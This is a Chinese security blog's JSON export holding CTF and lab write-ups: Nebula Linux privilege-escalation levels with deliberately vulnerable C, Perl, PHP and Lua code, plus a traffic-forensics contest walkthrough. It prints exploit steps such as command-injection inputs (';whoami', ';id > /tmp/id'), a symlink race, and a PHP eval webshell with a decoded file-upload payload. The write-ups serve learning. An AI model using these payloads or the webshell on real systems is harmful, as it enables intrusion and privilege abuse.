{"meta":{"title":"daiker's blog","subtitle":null,"description":null,"author":"daiker","url":"http://www.daikersec.com"},"pages":[{"title":"","date":"2018-06-20T05:44:16.622Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"404.html","permalink":"http://www.daikersec.com/404.html","excerpt":"","text":"哎呀~您的页面不存在！您看是返回首页还是返回首页？ BODY { PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; FONT: 14px/1.6 Arial, Sans-serif; PADDING-TOP: 0px } A:link { COLOR: #ea1921; TEXT-DECORATION: none } A:visited { COLOR: #ea1921; TEXT-DECORATION: none } H1 { Z-INDEX: 2; POSITION: relative; PADDING-BOTTOM: 0px; MARGIN: 140px auto 15px; PADDING-LEFT: 0px; WIDTH: 600px; PADDING-RIGHT: 0px; OVERFLOW: hidden; PADDING-TOP: 0px; xxxxborder: 1px solid } H2 { POSITION: absolute; TEXT-INDENT: -999px; MARGIN: 0px; FONT-SIZE: 0px; TOP: 0px; CURSOR: default; LEFT: 0px; -moz-user-select: none; -webkit-user-select: none; user-select: none } H2 EM { LINE-HEIGHT: 120px; FONT-STYLE: italic; TEXT-INDENT: 0px; DISPLAY: block; FONT-FAMILY: \"Times New Roman\", Times, Serif; LETTER-SPACING: -5px; COLOR: #ffdfdf; FONT-SIZE: 200px; FONT-WEIGHT: bold } .link A { MARGIN-RIGHT: 1em } .link { MARGIN: 0px auto 15px; WIDTH: 600px; COLOR: #505050 } .texts { MARGIN: 0px auto 15px; WIDTH: 600px; COLOR: #505050 } .texts { LINE-HEIGHT: 2 } .texts DD { PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 15px; PADDING-RIGHT: 0px; PADDING-TOP: 0px } .texts UL { PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; PADDING-TOP: 0px } .portal { TEXT-ALIGN: center; WHITE-SPACE: nowrap; COLOR: #505050; WORD-SPACING: 0.45em } .portal A:link { COLOR: #505050; WORD-SPACING: 0px } .portal A:visited { COLOR: #505050; WORD-SPACING: 0px } .portal A:hover { COLOR: #db1a22 } .portal A:active { COLOR: #db1a22 } .portal SPAN { LINE-HEIGHT: 35px; DISPLAY: inline-block; HEIGHT: 38px } .portal SPAN SPAN { PADDING-BOTTOM: 0px; PADDING-LEFT: 20px; PADDING-RIGHT: 0px; PADDING-TOP: 0px } .portal SPAN SPAN SPAN { PADDING-BOTTOM: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 20px; BACKGROUND-POSITION: 100% -80px; PADDING-TOP: 0px } var _gaq = _gaq || []; _gaq.push(['_setAccount', 'UA-11293844-1']); _gaq.push(['_trackPageview']); (function() { var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s); })(); 哎哟～404了～休息一下，玩玩这个游戏！ 抱歉, 您所查找的页面不存在, 可能已被删除或您输错了网址! 抱歉, 您所查找的页面不存在, 可能已被删除或您输错了网址! &#9666;返回首页 &#9666;返回上一页 休息一下，玩玩这个游戏。 游戏玩法：将猫困在一个深色原点围成的圈子里面就算成功了。"},{"title":"","date":"2018-06-20T05:44:16.622Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"baidu_verify_t3hw8bdjst.html","permalink":"http://www.daikersec.com/baidu_verify_t3hw8bdjst.html","excerpt":"","text":"t3hw8bdjst"},{"title":"","date":"2018-06-20T05:44:16.622Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"google4f3d2a0004eb46fb.html","permalink":"http://www.daikersec.com/google4f3d2a0004eb46fb.html","excerpt":"","text":"google-site-verification: google4f3d2a0004eb46fb.html"},{"title":"About","date":"2018-06-20T05:44:16.622Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"about/index.html","permalink":"http://www.daikersec.com/about/index.html","excerpt":"","text":""},{"title":"Categories","date":"2018-06-20T05:44:16.622Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"categories/index.html","permalink":"http://www.daikersec.com/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2018-06-20T05:44:16.622Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"tags/index.html","permalink":"http://www.daikersec.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"利用Nebula学习Linux提权","slug":"利用Nebula学习Linux提权","date":"2018-06-04T09:00:24.000Z","updated":"2018-06-20T05:58:38.725Z","comments":true,"path":"wiki/5c949747.html","link":"","permalink":"http://www.daikersec.com/wiki/5c949747.html","excerpt":"0x00 Nebula介绍和玩法Nebula 是# Exploit Exercises 上的基础关他涉及了基本的源码级漏洞分析、提权。可以通过官网下载镜像进行安装。每一关都对应系统中以level开头的账号，密码与账号名相同（比如Level01,对应的系统帐号是level01），每玩一关，都需要用对应的账号登录系统，然后进入到/home/flag×目录中，与该level相关的代码、数据等都放在于此。之后通过运行getflag 来验证是否提权成功 0x01 level00 This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories. 查找suid的程序，直接通过find查找","text":"0x00 Nebula介绍和玩法Nebula 是# Exploit Exercises 上的基础关他涉及了基本的源码级漏洞分析、提权。可以通过官网下载镜像进行安装。每一关都对应系统中以level开头的账号，密码与账号名相同（比如Level01,对应的系统帐号是level01），每玩一关，都需要用对应的账号登录系统，然后进入到/home/flag×目录中，与该level相关的代码、数据等都放在于此。之后通过运行getflag 来验证是否提权成功 0x01 level00 This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories. 查找suid的程序，直接通过find查找 1find / -perm -u=s -type f 2&gt;/dev/null 看到比较奇怪的一个文件/bin/.../flag00提权成功是flag00不是level00了。这里利用的是suid 提权。研究下原理先看flag00的权限有setUidsetUid的功能是12341、SUID权限仅对二进制程序有效。2、执行者对于该程序需要具有x的可执行权限。3、本权限仅在执行该程序的过程中有效。4、执行者将具有该程序拥有者的权限。 再用IDA查看下flag0012345678910111213int __cdecl main(int argc, const char **argv, const char **envp)&#123; __gid_t v3; // ST18_4 __uid_t v4; // ST1C_4 v3 = getegid(); v4 = geteuid(); setresgid(v3, v3, v3); setresuid(v4, v4, v4); puts(\"Congrats, now run getflag to get your flag!\"); return execve(\"/bin/sh\", (char *const *)argv, (char *const *)envp);&#125; 所以大体的原理就是flag00属于flag00这个用户,在level00这个组。在level00这个用户也在level00这个组里面，这里拥有执行权限,而程序又有suid，因此level00在运行这个程序的时候暂时性拥有这个flag00的权限，接下来执行一个shell，并且这个shell传进的环境继承刚刚的环境,因此shell运行的时候的权限还是属于flag00的 0x02 level01 There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01. 123456789101112131415161718#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv, char **envp)&#123; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); system(\"/usr/bin/env echo and now what?\");&#125; 这个文件也有suid,关键在最后一句，我们能不能让最后一句执行shell。这里面/usr/bin/env后面跟着的是环境变量中的可执行程序，正常这一句，应该要在环境变量中寻找echo 这个可执行程序这个时候就会执行正常的echo。那我们的思路是 在/usr/bin这个环境变量之前添加个环境变量/home/level01，在’level01’里面有个我们自定义的echo. 这样不就执行我们自己的程序了 0x03 level02 There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02. 1234567891011121314151617181920212223242526#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv, char **envp)&#123; char *buffer; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); buffer = NULL; asprintf(&amp;buffer, \"/bin/echo %s is cool\", getenv(\"USER\")); printf(\"about to call system(\\\"%s\\\")\\n\", buffer); system(buffer);&#125; 跟上面类似，就要构造USER的值来填补，就可以进一步调用/bin/sh 0x04 level03 Check the home directory of flag03 and take note of the files there.There is a crontab that is called every couple of minutes.To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03. 在/home/flag03里面发现有一个文件writable.sh和writable.d查看writeable.sh的内容大意就是循环执行一遍writable.d文件夹底下的文件。然后删除。这个时候看题目，There is a crontab that is called every couple of minutes.几分钟会被调用一次。我们猜测可能是执行writable.sh把我们要执行的东西写到 writable.d里面去然后等个几分钟 接下来我们用root身份来看下corntab. 每三分钟执行一次writable.sh 0x05 level04 This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04. 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char **argv, char **envp)&#123; char buf[1024]; int fd, rc; if(argc == 1) &#123; printf(\"%s [file to read]\\n\", argv[0]); exit(EXIT_FAILURE); &#125; if(strstr(argv[1], \"token\") != NULL) &#123; printf(\"You may not access '%s'\\n\", argv[1]); exit(EXIT_FAILURE); &#125; fd = open(argv[1], O_RDONLY); if(fd == -1) &#123; err(EXIT_FAILURE, \"Unable to open %s\", argv[1]); &#125; rc = read(fd, buf, sizeof(buf)); if(rc == -1) &#123; err(EXIT_FAILURE, \"Unable to read fd %d\", fd); &#125; write(1, buf, rc);&#125; 分析:查看文件token这个文件的权限是0600，只允许flag04用户读取,没有读取权限。但是flag04这个文件我们有执行权限，隶属于flag04用户，并且有suid。简单分析源码，这个程序的主要功能就是读取文件输出。所以只要我们利用这个文件来读物token 就行，但是有个限制，就是读取的文件名不能叫做token。所以只需要利用软连接，建立一个名字中不含有token的文件，软链接到token 。 0x06 level05 Check the flag05 home directory. You are looking for weak directory permissionsTo do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05. 看到.ssh文件夹，推测可能是想通过ssh 登陆进来，但是.ssh文件夹的权限700。我们没有查看权限。这时候看到backup文件夹看到一个备份文件夹。解压下，果然是.ssh的压缩，就可以利用私钥登陆登陆成功 0x07 level06 The flag06 account credentials came from a legacy unix system.To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06. 通过这句话The flag06 account credentials came from a legacy unix system.，比较旧版本的Unix的密码是放在/etc/passwd这个时候我们就可以用john爆破，这里用的是kali上自带的然后登陆 0x08 level07 The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.源码12345678910111213141516171819use CGI qw&#123;param&#125;;print \"Content-type: text/html\\n\\n\";sub ping &#123; $host = $_[0]; print(\"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;\"); @output = `ping -c 3 $host 2&gt;&amp;1`; foreach $line (@output) &#123; print \"$line\"; &#125; print(\"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;\"); &#125;# check if Host set. if not, display normal page, etcping(param(\"Host\")); 看这行代码ping -c 3 $host 2&gt;&amp;1,典型的命令注入，构造host=127.0.01;whoami就可以执行whoami 0x09 level08 World readable files strike again. Check what that user was up to, and use it to log into flag08 account.To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08. 看到一个流量包wireshark 追踪流，以16进制形式展开其中7f是删除键,所以密码为backd00Rmate 0x0A level09 There’s a C setuid wrapper for some vulnerable PHP code…To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09. 源码1234567891011121314151617181920212223242526&lt;?phpfunction spam($email)&#123; $email = preg_replace(\"/\\./\", \" dot \", $email); $email = preg_replace(\"/@/\", \" AT \", $email); return $email;&#125;function markup($filename, $use_me)&#123; $contents = file_get_contents($filename); $contents = preg_replace(\"/(\\[email (.*)\\])/e\", \"spam(\\\"\\\\2\\\")\", $contents); $contents = preg_replace(\"/\\[/\", \"&lt;\", $contents); $contents = preg_replace(\"/\\]/\", \"&gt;\", $contents); return $contents;&#125;$output = markup($argv[1], $argv[2]);print $output;?&gt; 0x0B level10 The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call. 源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv)&#123; char *file; char *host; if(argc &lt; 3) &#123; printf(\"%s file host\\n\\tsends file to host if you have access to it\\n\", argv[0]); exit(1); &#125; file = argv[1]; host = argv[2]; if(access(argv[1], R_OK) == 0) &#123; int fd; int ffd; int rc; struct sockaddr_in sin; char buffer[4096]; printf(\"Connecting to %s:18211 .. \", host); fflush(stdout); fd = socket(AF_INET, SOCK_STREAM, 0); memset(&amp;sin, 0, sizeof(struct sockaddr_in)); sin.sin_family = AF_INET; sin.sin_addr.s_addr = inet_addr(host); sin.sin_port = htons(18211); if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) &#123; printf(\"Unable to connect to host %s\\n\", host); exit(EXIT_FAILURE); &#125;#define HITHERE \".oO Oo.\\n\" if(write(fd, HITHERE, strlen(HITHERE)) == -1) &#123; printf(\"Unable to write banner to host %s\\n\", host); exit(EXIT_FAILURE); &#125;#undef HITHERE printf(\"Connected!\\nSending file .. \"); fflush(stdout); ffd = open(file, O_RDONLY); if(ffd == -1) &#123; printf(\"Damn. Unable to open file\\n\"); exit(EXIT_FAILURE); &#125; rc = read(ffd, buffer, sizeof(buffer)); if(rc == -1) &#123; printf(\"Unable to read from file: %s\\n\", strerror(errno)); exit(EXIT_FAILURE); &#125; write(fd, buffer, rc); printf(\"wrote file!\\n\"); &#125; else &#123; printf(\"You don't have access to %s\\n\", file); &#125;&#125; 这是一种叫文件访问竞态条件的漏洞.维基百科里面介绍的很详细了Time_of_check_to_time_of_use.大体利用是这用的。先大体看下代码首先通过access 验证是否有文件读取权限if(access(argv[1], R_OK) == 0)。前面有说到suid会在执行的时候暂时性拥有文件拥有者的权限。这个在底层代码里面体现为euid，即有限的uid，比如我当前用户是level10,uid为1011，那执行正常的程序的时候我们euid=uid=1011，但是在有suid的程序中，euid=文件拥有者的uid=flag10的uid=989。一般的判断都是通过euid。但是这里有个意外，就是access是通过uid而不是euid。所以这里，执行者为level10，没有执行的权限，验证不通过。维基百科上给出的利用条件是利用软连接代码是这样的123456if(access(文件名, R_OK) == 0) &#123; ... ffd = open(file, O_RDONLY); ... rc = read(ffd, buffer, sizeof(buffer)); &#125; 我们用个软连接，让access之前lntoken 链接到 faketoken，这里的话，level10对 faketoken具有读取权限，验证通过。。接下来在open之前。把lntoken 链接到token，这个时候由于是suid，而且open 验证的是euid。所以读取成功。我们想实现的伪代码如下12345678ln -sf faketoken lntokenif(access(文件名, R_OK) == 0) &#123; =&gt; 验证通过 ln -sf realtoken lntoken =&gt; 已经指向正确的token 了 ... ffd = open(file, O_RDONLY); ... rc = read(ffd, buffer, sizeof(buffer)); &#125; 这种现象在单线程下几乎不可能，控制到那么精准的时间更换软连接。但是现在的Linux几乎是多线程的，就可以条件竞争。具体利用如下新建fakeotkoen新建个不断软连接的死循环，这里我用-x 方便看到具体过程再看一个终端，不断执行程序。 接收到真的token可以登录了 0x0C level11 The /home/flag11/flag11 binary processes standard input and executes a shell command.There are two ways of completing this level, you may wish to do both :-) 0x0D level12 There is a backdoor process listening on port 50001. 源码123456789101112131415161718192021222324252627282930313233local socket = require(\"socket\")local server = assert(socket.bind(\"127.0.0.1\", 50001))function hash(password) prog = io.popen(\"echo \"..password..\" | sha1sum\", \"r\") data = prog:read(\"*all\") prog:close() data = string.sub(data, 1, 40) return dataendwhile 1 do local client = server:accept() client:send(\"Password: \") client:settimeout(60) local line, err = client:receive() if not err then print(\"trying \" .. line) -- log from where ;\\ local h = hash(line) if h ~= \"4754a4f4bd5787accd33de887b9250a0691dd198\" then client:send(\"Better luck next time\\n\"); else client:send(\"Congrats, your token is 413**CARRIER LOST**\\n\") end end client:close()end 看下这个程序，就是把你输入的密码经过hash后跟4754a4f4bd5787accd33de887b9250a0691dd198比较，如果一样，就输出Congrats, your token is 413**CARRIER LOST**。这里面的hash是自定义的123456789function hash(password) prog = io.popen(\"echo \"..password..\" | sha1sum\", \"r\") data = prog:read(\"*all\") prog:close() data = string.sub(data, 1, 40) return dataend 。问题就出再popen里面prog = io.popen(&quot;echo &quot;..password..&quot; | sha1sum&quot;, &quot;r&quot;)。通过调用系统命令来获取hash的。这一步拼接字符串，造成任意命令执行。所以我们构造;id &gt; /tmp/id看看是flag12的 0x0E level13 There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id. 123456789101112131415161718192021222324#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;string.h&gt;#define FAKEUID 1000int main(int argc, char **argv, char **envp)&#123; int c; char token[256]; if(getuid() != FAKEUID) &#123; printf(&quot;Security failure detected. UID %d started us, we expect %d\\n&quot;, getuid(), FAKEUID); printf(&quot;The system administrators will be notified of this violation\\n&quot;); exit(EXIT_FAILURE); &#125; // snip, sorry :) printf(&quot;your token is %s\\n&quot;, token); &#125; 这是一道简单的ELF逆向题，我这里提供两种思路第一种动态调试.我用的是IDA.在IDA的dbgsrv文件夹底下将linux_server拷贝到Linux服务器上运行，，然后打开ida 。Debugger -&gt; run -&gt; remote Linux debugger然后开始配置Application输要调试程序在服务器上的绝对路径。Diresctory 输所在的路径Host 输服务器的IP跟OD基本一样了，F2在main函数下个断点，然后单步调试执行到080484F9处，这里面的判断正是if(getuid() != FAKEUID)这个判断，通过修改zf标志位改变执行流程。在服务器端输出token 的值用于登陆第二种方法是通过IDA静态查看代码，手动计算token的值利用F5插件，查看类C代码1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp)&#123; __uid_t v3; // eax int v4; // ecx int i; // [esp+28h] [ebp-110h] int v7; // [esp+2Ch] [ebp-10Ch] unsigned int v8; // [esp+12Ch] [ebp-Ch] v8 = __readgsdword(0x14u); if ( getuid() != 1000 ) &#123; v3 = getuid(); printf(\"Security failure detected. UID %d started us, we expect %d\\n\", v3, 1000); puts(\"The system administrators will be notified of this violation\"); exit(1); &#125; memset(&amp;v7, 0, 0x100u); strcpy(&amp;v7, \"8mjomjh8wml;bwnh8jwbbnnwi;&gt;;88?o;9ob\"); v4 = *(_DWORD *)\";9ob\"; for ( i = 0; *((_BYTE *)&amp;v7 + i); ++i ) *((_BYTE *)&amp;v7 + i) ^= 0x5Au; return printf(\"your token is %s\\n\", &amp;v7);&#125; 关键在123456memset(&amp;v7, 0, 0x100u);strcpy(&amp;v7, &quot;8mjomjh8wml;bwnh8jwbbnnwi;&gt;;88?o;9ob&quot;);v4 = *(_DWORD *)&quot;;9ob&quot;;for ( i = 0; *((_BYTE *)&amp;v7 + i); ++i ) *((_BYTE *)&amp;v7 + i) ^= 0x5Au;return printf(&quot;your token is %s\\n&quot;, &amp;v7); 这里面V7的值就是token 。我使用python 计算123456789#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-06-07 19:13:48# @Author : daiker (daikersec@gmail.com)# @Link : http://daikersec.com# @Version : $Id$token = \"8mjomjh8wml;bwnh8jwbbnnwi;&gt;;88?o;9ob\"print ''.join([chr(ord(i)^0x5A) for i in token]) 得到token 0x0F level14 This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :) 是个加密程序，利用IDA来看下加密算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; bool v3; // cf bool v4; // zf signed int v5; // ecx const char *v6; // esi _BYTE *v7; // edi int v8; // [esp+2Ch] [ebp-5Ch] signed int i; // [esp+30h] [ebp-58h] signed int v10; // [esp+34h] [ebp-54h] char buf[64]; // [esp+3Ch] [ebp-4Ch] unsigned int v12; // [esp+7Ch] [ebp-Ch] v12 = __readgsdword(0x14u); v8 = 0; if ( argc &lt;= 1 ) goto LABEL_17; v3 = __CFADD__(argv, 4); v4 = argv + 1 == 0; v5 = 3; v6 = argv[1]; v7 = &amp;unk_8048660; do &#123; if ( !v5 ) break; v3 = (const unsigned __int8)*v6 &lt; *v7; v4 = *v6++ == *v7++; --v5; &#125; while ( v4 ); if ( (!v3 &amp;&amp; !v4) != v3 ) &#123;LABEL_17: printf(&quot;%s\\n\\t-e\\tEncrypt input\\n&quot;, *argv); exit(1); &#125; while ( 1 ) &#123; v10 = read(0, buf, 0x40u); if ( v10 &lt;= 0 ) break; for ( i = 0; i &lt; v10; ++i ) buf[i] += v8++; if ( write(1, buf, v10) &lt;= 0 ) exit(0); &#125; exit(0);&#125; 核心加密在 12345678910while ( 1 ) &#123; v10 = read(0, buf, 0x40u); if ( v10 &lt;= 0 ) break; for ( i = 0; i &lt; v10; ++i ) buf[i] += v8++; if ( write(1, buf, v10) &lt;= 0 ) exit(0); &#125; 就是将每个字节的ASCII加上0,1,2,3这样，用python 写个解密算法 1234567891011121314151617#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-06-07 19:53:26# @Author : daiker (daikersec@gmail.com)# @Link : http://daikersec.com# @Version : $Id$with open(\"token\",\"rb\") as f: order = 0 token = \"\" while True: data = f.read(1) if not data: break token += chr(ord(data)-order) order += 1print token token为 0x10level15 strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.Clean up after yourself :) 0x11 level16 There is a perl script running on port 1616. 源码12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env perluse CGI qw&#123;param&#125;;print \"Content-type: text/html\\n\\n\";sub login &#123; $username = $_[0]; $password = $_[1]; $username =~ tr/a-z/A-Z/; # conver to uppercase $username =~ s/\\s.*//; # strip everything after a space @output = `egrep \"^$username\" /home/flag16/userdb.txt 2&gt;&amp;1`; foreach $line (@output) &#123; ($usr, $pw) = split(/:/, $line); if($pw =~ $password) &#123; return 1; &#125; &#125; return 0;&#125;sub htmlz &#123; print(\"&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;\"); if($_[0] == 1) &#123; print(\"Your login was accepted&lt;br/&gt;\"); &#125; else &#123; print(\"Your login failed&lt;br/&gt;\"); &#125; print(\"Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\\n\");&#125;htmlz(login(param(\"username\"), param(\"password\")));","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"提权","slug":"渗透测试/提权","permalink":"http://www.daikersec.com/categories/渗透测试/提权/"},{"name":"Linux","slug":"渗透测试/提权/Linux","permalink":"http://www.daikersec.com/categories/渗透测试/提权/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"},{"name":"提权","slug":"提权","permalink":"http://www.daikersec.com/tags/提权/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/tags/渗透测试/"}]},{"title":"铁人三项2018第七赛区(福建)数据赛wp","slug":"铁人三项2018第七赛区-福建-数据赛wp","date":"2018-05-15T13:44:37.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/ba9a968.html","link":"","permalink":"http://www.daikersec.com/wiki/ba9a968.html","excerpt":"0x00 题目链接:密码：0ple题目:密码：ngkm","text":"0x00 题目链接:密码：0ple题目:密码：ngkm 0x01 写webshell先通过httppcap 提取出http浏览脚本如下1234for file in `ls`do parse_pcap -vvv $file &gt; content/$file.txtdone 第一关是关卡描述：网站后台密码是多少这里制作一个匹配脚本，后面用的到123456for file in `ls`do echo $file cat $file|grep $1 echo \"-----------------------------------------------------\"done 执行./1.sh pass发现大量爆破接下来匹配./1.sh &quot;&amp;password=&quot;尝试下查看下最后一个爆破的回包username=admin&amp;password=aabbcc在结合302，location，set-Cookie可以看出这个已经爆破成功，所以第一题关卡描述：网站后台密码是多少是aabbcc。攻击者IP是202.1.1.2。接下来看第三题。网站后台登陆地址是多少（http://+ip+路径）找到一个爆破的包，有这么几行123[202.1.1.2:15717] -- -- --&gt; [192.168.1.203:80] POST /ad_admin.php?mod=login HTTP/1.1Host: 202.1.1.1 我就填了http://202.1.1.1/ad_admin.php结果不行，后来填了http://192.168.1.203/ad_admin.php，答案正确，我觉得应该是第一个更贴切。接下来的问题是找webshell。我通过匹配菜刀连接特征寻找猜到痕迹。在data-sence2_00003_20180204180642.pcapng.txt里面,向前看，在第一个shell2.php前面，爆破成功后面找到这句话解码得到$fp = fopen(&quot;shell2.php&quot;, &quot;w&quot;);fwrite($fp, &quot;&lt;?php eval(\\$_POST[&#39;cmd&#39;]);?&gt;&quot;);fclose($fp);所以webshell的内容是&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;接下来从第五题开始分析的是菜刀里面的内容 0x02 菜刀内容5. 关卡描述：网站数据库密码是多少在data-sence2_00007_20180204183072.pcapng.txt里面所以密码是newnrtpassword6. 黑客第一个上传的php文件名是什么在data-sence2_00005_20180204181416.pcapng里面解码为1@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);if(PHP_VERSION&lt;&apos;5.3.0&apos;)&#123;@set_magic_quotes_runtime(0);&#125;;echo(&quot;X@Y&quot;);$f=&apos;/var/www/html/diypage/scan.php&apos;;$c=$_POST[&quot;z1&quot;];$c=str_replace(&quot;\\r&quot;,&quot;&quot;,$c);$c=str_replace(&quot;\\n&quot;,&quot;&quot;,$c);$buf=&quot;&quot;;for($i=0;$i&lt;strlen($c);$i+=2)$buf.=urldecode(&apos;%&apos;.substr($c,$i,2));echo(@fwrite(fopen($f,&apos;w&apos;),$buf)?&apos;1&apos;:&apos;0&apos;);;echo(&quot;X@Y&quot;);die(); 所以结果为scan.php7. 关卡描述：黑客对内网扫描的范围是多少(ip1-ip2)结合上面的scan.php，应该是通过scan.php来匹配的。我们匹配下./1.sh scan.php在data-sence2_00005_20180204181416.pcapng里面是从192.168.2.1到192.168.2.1508. 描述：黑客下载的数据库备份文件名是什么匹配./1.sh bak所以是bak_2018-01-29-17-47-52.zip9. 关卡描述：黑客上传的图片木马的密码是多少用./1.sh &#39;array_map(&quot;ass&quot;.&quot;ert&quot;,array&#39;匹配菜刀内容，图片应该post的包是蛮大的。总共比较大的就几个。然后一个个解码，根据文件名，找到favicon.ico&#39; 在data-sence2_00007_20180204183702.pcapng里面 拖进winhex所以图片马的密码是 picto10. 黑客修改了哪个文件来配合木马文件(绝对路径)上面传的是图片马，不能直接利用，要配合使用，应该 是利用文件包含先过滤菜刀，再过滤include./1.sh &#39;array_map(&quot;ass&quot;.&quot;ert&quot;,array&#39;|grep include在这里面看到include%28..%2Ffavicon.ico解码，得到文件名为/var/www/html/diypage/adm/obj_edit.php接下来的操作都是通过tunnel代理 0x03 web代理11 关卡描述：FTP服务器开在了哪个端口reGeorg这个工具常用于web代理，查找端口我们可以直接利用./1.sh &#39;?cmd=connect&amp;target=&#39;过滤，查找到有1433，10062，10063三个端口，我们一个个过滤(比赛的时候懒得过滤，有5次提交机会，所以一个个试，是1433).通过wireshark过滤tcp.port == 1433 || udp.port == 1433追踪流可以看到ftp登录，因此就是他了12 黑客使用FTP上传的文件名追踪1433的流，发现大量登录爆破，在成功的那个流里面文件名是readmd.rtf13 黑客登陆FTP的密码是多少也是在这个流里面密码是qweasd123!@#14. 黑客使用FTP上传的文件中的文件内容是什么在这个的中间寻找流，刚好在226上面那条","categories":[{"name":"取证","slug":"取证","permalink":"http://www.daikersec.com/categories/取证/"},{"name":"流量分析","slug":"取证/流量分析","permalink":"http://www.daikersec.com/categories/取证/流量分析/"}],"tags":[{"name":"wireshark","slug":"wireshark","permalink":"http://www.daikersec.com/tags/wireshark/"},{"name":"数据分析","slug":"数据分析","permalink":"http://www.daikersec.com/tags/数据分析/"},{"name":"取证","slug":"取证","permalink":"http://www.daikersec.com/tags/取证/"},{"name":"日志分析","slug":"日志分析","permalink":"http://www.daikersec.com/tags/日志分析/"},{"name":"流量分析","slug":"流量分析","permalink":"http://www.daikersec.com/tags/流量分析/"}]},{"title":"铁人三项数据赛样题分析","slug":"铁人三项数据赛样题分析","date":"2018-04-22T14:30:02.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/3c7f43ba.html","link":"","permalink":"http://www.daikersec.com/wiki/3c7f43ba.html","excerpt":"0x00 题目下载链接: 数据赛 密码：wabt 解压密码：t3sectimu题目要求:背景提示：黑客对一个网站管理系统进行了暴力破解，成功获取了管理权限，并下载了重要文件。问题： （1）黑客最终获得了什么用户名（2）黑客最终获得了什么密码（3）黑客修改了什么文件（4）黑客使用菜刀的完整连接地址（5）黑客使用菜刀的连接密码(6)黑客的查看的第一个文件目录是什么","text":"0x00 题目下载链接: 数据赛 密码：wabt 